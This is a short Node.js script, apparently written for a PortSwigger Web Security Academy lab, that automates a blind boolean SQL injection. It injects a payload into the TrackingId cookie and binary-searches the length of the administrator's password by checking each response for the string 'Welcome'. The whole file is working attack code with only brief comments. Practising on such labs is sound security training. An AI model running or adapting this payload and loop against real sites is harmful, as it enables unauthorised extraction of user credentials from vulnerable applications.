import fetch from "node-fetch";

async function findLength() {
  // This string can be found on page, when SQL request is true
  const flag = "Welcome";

  // The min and max supposed value length
  // if script return end value, but sql query with it is not true, increase end value
  let start = 1;
  let end = 128;

  // You must use '>' operator and 'middle' variable in SQL query!
  while (true) {
    let middle = Math.floor((start + end) / 2);

    // URL
    const url = new URL(
      "https://0ab400e503b6e9b4c0d045ab00f80025.web-security-academy.net/login"
    );

    // Method, headers and body
    const options = {
      method: "GET",
      headers: {
        Cookie: `TrackingId=BlzXFEUoJcpSPeyv'+and+(select+'a'+from+users+where+username='administrator'+and+length(password)>${middle})='a`,
        "User-Agent":
          "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0",
      },
      // body: '',
    };
    const response = await fetch(url, options);
    const responseText = await response.text();
    const greaterThanMiddle = responseText.includes(flag);
    const twoValues = end - start <= 1;
    if (twoValues && greaterThanMiddle) {
      return end;
    } else if (twoValues && !greaterThanMiddle) {
      return start;
    } else if (greaterThanMiddle) {
      start = middle + 1;
    } else {
      end = middle;
    }
  }
}

// Call function and check run time
console.log("Please wait...");
const timeBefore = new Date();
const answ = await findLength();
const timeAfter = new Date();
const seconds = Math.round((timeAfter - timeBefore) / 1000);
console.log("Value length:", answ, "Spend time:", seconds, "seconds");
